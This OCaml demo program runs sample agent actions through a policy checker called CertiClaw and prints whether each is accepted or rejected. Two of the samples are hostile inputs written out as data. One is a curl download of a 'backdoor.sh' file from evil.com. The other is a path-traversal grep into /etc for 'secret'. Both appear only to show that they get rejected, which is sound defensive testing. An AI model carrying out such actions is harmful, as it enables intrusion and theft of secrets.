(** CertiClaw demo — runs several sample actions through the
    check-and-plan pipeline and prints structured output.

    Usage: dune exec bin/demo.exe *)

open Certiclaw.Types
open Certiclaw.Infer
open Certiclaw.Plan

(* ------------------------------------------------------------------ *)
(* Demo policy                                                         *)
(* ------------------------------------------------------------------ *)

let demo_policy : policy = {
  readable_paths = ["/home/user/src"];
  writable_paths = ["/home/user/src"; "/tmp"];
  allowed_bins   = ["grep"; "curl"; "find"];
  allowed_hosts  = ["example.com"];
  allowed_mcp    = [("files", "read_file")];
}

(* ------------------------------------------------------------------ *)
(* Helper: run one demo case                                           *)
(* ------------------------------------------------------------------ *)

let run_demo label action proof =
  Printf.printf "──────────────────────────────────────────\n";
  Printf.printf "DEMO: %s\n" label;
  Printf.printf "──────────────────────────────────────────\n";
  Printf.printf "IR:      %s\n" (show_action action);
  Printf.printf "Effects: [%s]\n"
    (String.concat "; " (List.map show_action_effect (infer_effects action)));
  (match plan ~dry_run:true ~policy:demo_policy ~proof action with
   | Ok p ->
     Printf.printf "Check:   ACCEPTED\n";
     Printf.printf "Render:  %s\n" (show_rendered p.rendered);
     Printf.printf "Mode:    %s\n" (if p.dry_run then "dry-run" else "live")
   | Error err ->
     Printf.printf "Check:   REJECTED — %s\n" (show_check_error err));
  Printf.printf "\n"

(* ------------------------------------------------------------------ *)
(* Demo cases                                                          *)
(* ------------------------------------------------------------------ *)

let () =
  Printf.printf "\n=== CertiClaw Dry-Run Demo ===\n\n";

  (* 1. Valid grep *)
  let action1 = GrepRecursive {
    pattern = "TODO"; root = "/home/user/src"; output = "/tmp/todos.txt"
  } in
  let effects1 = infer_effects action1 in
  run_demo "Valid grep (should ACCEPT)" action1 {
    claimed_effects = effects1;
    destructive = false; approval = None;
    explanation = Some "Search for TODOs";
  };

  (* 2. Invalid remove — no approval *)
  let action2 = RemoveByGlob {
    root = "/tmp"; suffix = ".log"; recursive = true
  } in
  let effects2 = infer_effects action2 in
  run_demo "Remove without approval (should REJECT)" action2 {
    claimed_effects = effects2;
    destructive = true; approval = None;
    explanation = None;
  };

  (* 3. Invalid curl — disallowed host *)
  let action3 = CurlToFile {
    url = "https://evil.com/backdoor.sh"; host = "evil.com";
    output = "/tmp/backdoor.sh"
  } in
  let effects3 = infer_effects action3 in
  run_demo "Curl to disallowed host (should REJECT)" action3 {
    claimed_effects = effects3;
    destructive = false; approval = None;
    explanation = None;
  };

  (* 4. Valid MCP call *)
  let action4 = McpCall {
    server = "files"; tool = "read_file";
    args = {|{"path": "/home/user/src/main.ml"}|}
  } in
  let effects4 = infer_effects action4 in
  run_demo "Valid MCP call (should ACCEPT)" action4 {
    claimed_effects = effects4;
    destructive = false; approval = None;
    explanation = Some "Read source file";
  };

  (* 5. Path traversal attempt *)
  let action5 = GrepRecursive {
    pattern = "secret"; root = "/home/user/src/../../../etc";
    output = "/tmp/secrets.txt"
  } in
  let effects5 = infer_effects action5 in
  run_demo "Path traversal attempt (should REJECT)" action5 {
    claimed_effects = effects5;
    destructive = false; approval = None;
    explanation = None;
  };

  Printf.printf "=== Demo complete ===\n"
